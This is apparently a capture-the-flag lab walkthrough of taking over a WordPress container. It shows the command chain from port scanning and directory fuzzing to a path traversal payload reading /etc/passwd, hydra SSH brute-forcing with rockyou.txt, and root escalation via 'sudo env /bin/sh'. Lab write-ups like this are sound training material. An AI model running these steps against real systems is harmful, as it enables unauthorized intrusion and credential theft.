![image](https://github.com/user-attachments/assets/9283c3f4-4723-4b41-8e08-abd86a598923)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p80,3000,5000 172.17.0.2 -oN targeted
```
![Pasted image 20250130200220](https://github.com/user-attachments/assets/37450698-e928-4bc1-80ee-f0c60a317994)
![Pasted image 20250130200300](https://github.com/user-attachments/assets/45a04b04-11e0-4648-b91f-9b0958536d4d)

## **Fuzzing**
```bash
gobuster dir -u http://172.19.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![Pasted image 20250130200540](https://github.com/user-attachments/assets/f1fda2a5-7603-4968-bd1a-5e929f7d1ad5)
![Pasted image 20250130200558](https://github.com/user-attachments/assets/8503c05d-28f9-43eb-943e-33b436e0ffdf)

## **We found a hidden page but we don't have anything yet so we will apply fuzzing again to this new site.**
```bash
gobuster dir -u http://172.19.0.2/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![Pasted image 20250130200837](https://github.com/user-attachments/assets/bcff72b5-8a90-4f4d-b0e8-8508d28ef420)
![Pasted image 20250130200859](https://github.com/user-attachments/assets/6e8fb61b-57ba-4958-9341-3a034acc78cb)

## **here we find a **.php** file that is executing something so we will try to execute a command to give us a response**
```bash
http://172.18.0.2/wordpress/index.php?love=../../../../../../../etc/passwd
```
![Pasted image 20250130201108](https://github.com/user-attachments/assets/4ed9d5e5-40b4-48ec-9238-2a17187667c7)

## **we have already found 2 users rosa and pedro so we will try to connect to **SSH** with one of these users**
```bash
hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2
```
![Pasted image 20250130201313](https://github.com/user-attachments/assets/7e5d1dee-2cae-421f-819d-ecda8f83b32e)

## **now we connect via ssh**
```bash
ssh rosa@172.19.0.2
```
![Pasted image 20250130201407](https://github.com/user-attachments/assets/fb19b8e9-9872-4023-9c03-077c84a69b79)

```bash
sudo -l
```
![Pasted image 20250130201454](https://github.com/user-attachments/assets/acb17790-807e-47de-a00f-e816de2737b6)

## **we have root permissions without passwd to use the command 'ls' and 'cat' now let's investigate**

![Pasted image 20250130201638](https://github.com/user-attachments/assets/09827cb4-097d-43a7-8b4c-8575bcb0fe7e)

## **we don't have enough permissions but we can use ls and cat**

![Pasted image 20250130201819](https://github.com/user-attachments/assets/28014c04-8d4c-4aaf-a46a-75c3148fadc2)

## **we have nothing now search for us in root directory**

![Pasted image 20250130201954](https://github.com/user-attachments/assets/071e12ff-9f7e-42c5-8061-ebc5add01252)

## **from the root directory we get a code that appears to be hexadecimal**

![Pasted image 20250130202037](https://github.com/user-attachments/assets/b48ce935-dfbc-4426-972d-a22bd18b02d5)

## **we will try to change the user with this new password**
```bash
su pedro
```
![Pasted image 20250130202141](https://github.com/user-attachments/assets/546c737c-6d66-4965-86f4-cae055aae6e7)

```bash
sudo -l
```
![Pasted image 20250130202211](https://github.com/user-attachments/assets/111ac277-334f-4b32-9540-087d05c1a697)
![Pasted image 20250130202225](https://github.com/user-attachments/assets/be3719b9-2e8e-4255-a411-0d592fe86a42)

```bash
sudo env /bin/sh
```
![Pasted image 20250130202308](https://github.com/user-attachments/assets/a68d5675-3a4f-4ded-be5b-8ea6273fc7dc)
